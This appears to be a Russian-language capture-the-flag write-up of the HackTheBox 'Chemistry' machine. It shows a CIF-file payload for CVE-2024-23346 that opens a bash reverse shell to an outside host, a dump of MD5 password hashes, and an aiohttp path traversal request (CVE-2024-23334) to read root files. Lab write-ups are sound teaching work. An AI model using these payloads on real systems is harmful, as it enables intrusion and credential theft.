@@ -1,0 +1,214 @@
+
+<!DOCTYPE html>
+<html>
+
+<head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <link rel="stylesheet" href="../../../../styles/default.css"/>
+        <link rel="stylesheet" type="text/css" href="../../../../styles/general.css">
+        <link rel="stylesheet" type="text/css" href="../../../../styles/article.css">
+        <link rel="stylesheet" type="text/css" href="../../../styles/homepage.css">
+
+        <link rel="stylesheet" type="text/css" href="../../../../styles/atom-one-dark.css">
+        
+
+        <script src="../../../../scripts/highlight.js"></script>
+        <script>hljs.highlightAll();</script>
+
+
+        <title></title>
+</head>
+
+<body>
+
+
+        <div class="article">
+        <div class="article-container">
+
+        <p class="article-title">
+        Разбор Chemistry - HackTheBox
+        </p>
+
+
+        <table class="main-user-info">
+
+        <tr>
+                <td class="user-info-key">Автор :</td>
+                <td class="user-info-key-value"><a href="../../../../authors/andreykin_plushkin/index.html">Андрейкин Плюшкин</a></td>
+        </tr>
+
+        <tr>
+                <td class="user-info-key">Дата публикации :</td>
+                <td class="user-info-key-value">23.02.2025</td>
+        </tr>
+
+        <tr>
+                <td class="user-info-key">Тэги :</td>
+                <td class="user-info-key-value">
+                        <div class="tags">
+                                <p class="tag">CVE-2024-23346</p>
+                                <p class="tag">CVE-2024-23334</p>
+                                <p class="tag">bruteforce</p>
+                                <p class="tag">RCE</p>
+                                <p class="tag">Path Traversal</p>
+                        </div>
+                </td>
+        </tr>
+
+        </table>
+
+        <h2>Короткий спойлер</h2>
+
+        <h3>user</h3>
+        <p>
+        <strong>CVE-2024-23346</strong> в библиотеке pymatgen. Получение RCE и доступ к пользователю <strong>app</strong>. Находим базу данных, получаем хэш пароля от аккаунта <strong>rosa</strong> и брутфорсим его. Применяем полученный пароль для подключения по SSH - доступ к пользователю обеспечен!
+        Читаем /home/rosa/flag.txt </p>
+
+
+        <h3>root</h3>
+        <p>
+        Находим среди процессов, запущенный пользователем <strong>root</strong> сайт на python. Поскольку, порт не открыт, то пробрасываем <strong>SSH-тунель</strong> для передачи трафика. Открывается сайт на фреймворке <strong>aiohttp</strong>. Находим для него <strong>CVE-2024-23334</strong>, запускаем фаззинг, для определения каталога, монтированного в сайте и с помощью него получаем <strong>Path Traversal + Arbitrary read file</strong>. Можем читать любой файл в системе из-под root. 
+        Читаем /root/root.txt </p>
+
+        <h2>Получаем пользователя rosa</h2>
+        <p>Сканируем нашу цель и находим открытые <strong>5000</strong> и <strong>22</strong> порт. Что-ж, пойдём смотреть, что нас ждёт на 5000 порту.</p>
+
+        <pre><code>
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
+|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
+|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
+5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
+|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
+|_http-title: Chemistry - Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
+        </code></pre>
+
+        <p>Что-ж, посмотрим, что у нас есть интересного. Загрузка файла с содержимым для кристаллографии. Сервер его загружает, обрабатывает и что-то возвращает. Пример файла нам дан. Скорее всего, тут какая-нибудь SSTI или полноценная RCE. Попробуем поискать в интернете уязвимости, которые были найдены в обработчике CIF файлов на питоне: (<a href="https://github.com/advisories/GHSA-vgv8-5cpj-qj2f">link</a>)</p>
+        <img src="images/google_CVE_1.png" class="article-image"></img>
+        <img src="images/google_CVE_2.png" class="article-image"></img>
+        <p>Мы можем эксплуатировать RCE с помощью CIF файла. Попробуем изменить исходный example.cif и отправить серверу следующее:</p>
+        <pre><code class="theme-atom-one-dark">
+data_Example
+cell_length_a    10.00000
+_cell_length_b    10.00000
+_cell_length_c    10.00000
+_cell_angle_alpha 90.00000
+_cell_angle_beta  90.00000
+_cell_angle_gamma 90.00000
+_symmetry_space_group_name_H-M 'P 1'
+loop
+_atom_site_label
+_atom_site_fract_x
+_atom_site_fract_y
+_atom_site_fract_z
+_atom_site_occupancy
+H 0.00000 0.00000 0.00000 1
+O 0.50000 0.50000 0.50000 1
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().class.mro[1].getattribute ( *[().class.mro[1]]+["sub" + "classes"]) () if d.name == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1\'");0,0,0'
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  "P  n'  m  a'  "
+        </code></pre>
+        <img src="images/upload_cif.jpg" class="article-image"></img>
+        <p>И получаем коннект к нашему серверу.</p>
+        <p>Посмотрим, какие существуют и с чем связан веб-сервер. В коде была указана БД, и я решил поискать её.</p>
+        <p>Посмотрел всё, что было на одном-двух каталогах выше и обнаружил <strong>database.db</strong> в instance</p>
+
+        <pre><code>
+app@chemistry:~/instance$ ls
+ls
+database.db
+        </code></pre>
+
+        <p>Надо срочно открыть эту базу данных и посмотреть, что там есть!</p>
+
+        <pre><code class="language-sql theme-atom-one-dark">
+app@chemistry:~/instance$ sqlite3 database.db
+sqlite3 database.db
+SQLite version 3.31.1 2020-01-27 19:55:54
+Enter ".help" for usage hints.
+sqlite&gt; .tables
+.tables
+structure  user      
+sqlite&gt; .schema user
+.schema user
+CREATE TABLE user (
+        id INTEGER NOT NULL,
+        username VARCHAR(150) NOT NULL,
+        password VARCHAR(150) NOT NULL,
+        PRIMARY KEY (id),
+        UNIQUE (username)
+);
+sqlite&gt; .schema structure
+.schema structure
+CREATE TABLE structure (
+        id INTEGER NOT NULL,
+        user_id INTEGER NOT NULL,
+        filename VARCHAR(150) NOT NULL,
+        identifier VARCHAR(100) NOT NULL,
+        PRIMARY KEY (id),
+        FOREIGN KEY(user_id) REFERENCES user (id),
+        UNIQUE (identifier)
+);
+sqlite&gt; SELECT * FROM user;
+1|admin|Скрыл хэши. Найдёте сами)
+2|app|Скрыл хэши. Найдёте сами)
+3|rosa|Скрыл хэши. Найдёте сами)
+4|robert|02fcf7cfc10adc37959fb21f06c6b467
+5|jobert|3dec299e06f7ed187bac06bd3b670ab2
+6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
+7|peter|6845c17d298d95aa942127bdad2ceb9b
+8|victoria|c3601ad2286a4293868ec2a4bc606ba3
+9|tania|a4aa55e816205dc0389591c9f82f43bb
+10|eusebio|6cad48078d0241cca9a7b322ecd073b3
+        </code></pre>
+        
+        <p>Пробуем брутфорсить хэш пользователей <strong>admin</strong> или <strong>rosa</strong> Поскольку <strong>rosa</strong> существует среди пользователей, то начать брутфорс решил с неё. И бинго! Пароль был получен!</p>
+        <p>Заходим по паролю на аккаунт <strong>rosa</strong> по SSH и получаем привилегии пользователя!!</p>
+
+        <h2>Получаем root</h2>
+        <p>Я попробовал посмотреть, что есть у нашей машины, и к удивлению, в процессах обнаружил скрипт на питоне, который запущен из-под рута.</p>
+
+        <img src="images/check_process.jpg">
+
+        <p>Не понял, для чего это, но я сразу же пошёл смотреть открытые порты и обнаружил следующее:</p>
+
+        <pre><code>rosa@chemistry:/opt$ netstat -ntlpa
+(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     
+tcp        0      0 0.0.0.0:12343           0.0.0.0:*               LISTEN      -                    tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      616881/-bash         
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    tcp        0     36 10.10.11.38:22          10.10.16.3:44528        ESTABLISHED -                    
+tcp        1      0 10.10.11.38:5000        10.10.14.250:39352      CLOSE_WAIT  -                    tcp        0      0 10.10.11.38:5000        10.10.14.61:48898</code></pre>
+
+        <p>Часть вывода я убрал, поскольку там указаны атакующие, и к тому-же, эта информация нам не нужна. </p>
+        <p>Пробуем пробросить <strong>12343</strong> порт. Ничего не приходит. Пробуем пробросить <strong>8080</strong> порт</p>
+
+        <pre><code>ssh -L 8080:localhost:8080 rosa@10.10.11.38</code></pre>
+
+        <p>И в этот раз мы уже открываем какую-то панель </p>
+
+        <img src="images/panel.jpg">
+
+        <p>Посмотрел всё, что на сайте есть, и никакого интересного функционала не нашёл. Один эндпоинт выводит список сервисов, а ничего другого нету. Одним словом - заглушка. 
+        Смотрю, что у нас за бэкенд, и вижу aiohttp. Окей, поищу его в интернете.</p>
+        <p>Удивительно? Удивительно. Находим <strong>CVE-2024-23334</strong>. Осталось понять, какой каталог примонтирован для статики, чтобы через него провести <strong>Path Traversal</strong>.</p>
+        <p>Фаззим:</p>
+        <pre><code>/assets               (Status: 403) [Size: 14]</code></pre>
+        <p>Отлично, теперь попробуем через него достать root.txt:</p>
+        <pre><code>GET http://127.0.0.1:8080/assets/../../../root/root.txt</code></pre>
+        <p>Chill! Chill! It's me CJ!</p>
+        <p>Получаем root.txt !</p>
+
+        </div> 
+        </div>
+
+</body>
+</html>
+
+
